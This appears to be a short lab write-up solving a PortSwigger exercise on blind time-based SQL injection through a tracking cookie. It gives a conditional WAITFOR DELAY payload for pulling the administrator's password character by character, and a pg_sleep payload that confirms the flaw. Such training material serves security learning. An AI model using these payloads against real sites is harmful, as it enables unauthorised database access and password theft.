## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4223d6fa-21ed-41c3-b356-08be62bb4752)

## Solution :

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time: 

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

Request captured--

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/96b5d11f-59c4-4df8-a030-521231977764)


Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```

Query Changed -

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>' '||pg_sleep(10)--
```


![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/556ddbc6-ae80-4529-a88b-5910f9a43958)

We get a response after 10 sec which confirms the SQL injection vulnerability.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/37a9afcd-637d-4bbd-acd4-08181e11cc5e)

Lab solved.

